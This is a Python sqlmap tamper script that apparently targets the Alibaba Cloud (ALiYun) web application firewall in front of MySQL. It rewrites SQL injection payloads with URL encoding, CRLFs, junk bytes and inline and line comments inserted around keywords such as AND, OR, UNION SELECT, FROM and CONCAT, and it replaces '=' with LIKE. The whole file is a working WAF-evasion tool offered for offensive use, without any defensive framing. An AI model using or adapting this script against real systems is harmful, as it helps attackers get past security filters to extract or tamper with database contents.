
#!/usr/bin/env python2
#user by: XG

import re
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        # ALiYun mysql
        # index.php?id=336699dfg

        retVal = re.sub(r" ", "%20", retVal)
        retVal = re.sub(r"\'\)%20AND%20", "%27%29%2f%2a%20%30%30%7d%7d%29%5d%5b%2a%2f%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aAND%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"\)%20AND%20", "%29%2f%2a%30%30%7d%7d%29%5d%5b%2a%2f%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aAND%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"\'%20AND%20", "%27%20%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aAND%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"%20AND%20", "%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aAND%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"%20OR%20NOT%20", "%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aOR%20NOT%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"%20OR%20", "%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aOR%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)   
        retVal = re.sub(r"=", "%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aLIKE%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0a", retVal)
        retVal = re.sub(r"\'%20UNION", "%27%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aUNION", retVal)
        retVal = re.sub(r"UNION%20SELECT%20", "UNION%0d%0a%20%2d%2d%20%81/*%99%20%0d%0a%0d%0a%0d%0aSELECT%0d%0a%20%2d%2d%20%81/*%99%0d%0a%0d%0a", retVal)
        retVal = re.sub(r"UNION%20ALL%20SELECT%20", "UNION%0d%0a%20%2d%2d%20%81/*%99%20%0d%0a%0d%0a%0d%0aALL%20SELECT%0d%0a%20%2d%2d%20%81/*%99%0d%0a%0d%0a", retVal)
        retVal = re.sub(r"%20FROM", "%0d%0a%20%2d%2d%20%87%0d%0aFROM", retVal)
        retVal = re.sub(r"FROM%20INFORMATION_SCHEMA\.", "FROM%0d%0a%20%2d%2d%20%5d%5b%81%20%0d%0aINFORMATION_SCHEMA%0d%0a.", retVal)
        retVal = re.sub(r"CASE%20", "CASE%0D%0A%0d%2d%2d%20%99%29%20%0d%0a", retVal)
        retVal = re.sub(r"THEN%20", "THEN%0D%0A%0d%2d%2d%20%99%29%20%0d%0a", retVal)
        retVal = re.sub(r"ELT\(", "ELT%20%2d%2d%20%29%29%29%29%29%29%0d%0a%28", retVal)
        #retVal = re.sub(r"\(SELECT%20", "%28%20%2d%2d%0d%99%20%0d%0aSELECT%0D%0A%0d%2d%2d%20%99%29%20%0d%0a", retVal)
        #retVal = re.sub(r"\(SELECT%20", "%28%20%2d%2d%0d%99%5b%5d%20%0d%0aSELECT%0D%0A%0d%2d%2d%20%99%29%20%0d%0a", retVal)        
        retVal = re.sub(r"\(SELECT%20", "%28%20%20%23%20%2f%2a%99%29%5d%5b%7b%7d%23%5b%5d%0aSELECT%20", retVal)
        retVal = re.sub(r"SELECT%20\(", "SELECT%20%2d%2d%20%29%29%29%5b%5d%7b%7d%0d%0a%28", retVal)
        retVal = re.sub(r"CONCAT\(", "CONCAT%20%23%20%89%0d%0a%28", retVal)
        retVal = re.sub(r"CHR\(", "CHR%20%2d%2d%20%29%29%29%29%5b%5d%7b%7d%0d%0a%28", retVal)
        retVal = re.sub(r"CHAR\(", "CHAR%20%2d%2d%20%29%29%29%29%5b%5d%7b%7d%0d%0a%28", retVal)
        retVal = re.sub(r"EXTRACTVALUE\(", "EXTRACTVALUE%20%23%20%89%0d%0a%28", retVal)
        
        #retVal = re.sub(r"%20INFORMATION_SCHEMA", "%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a", retVal)
        
    return retVal
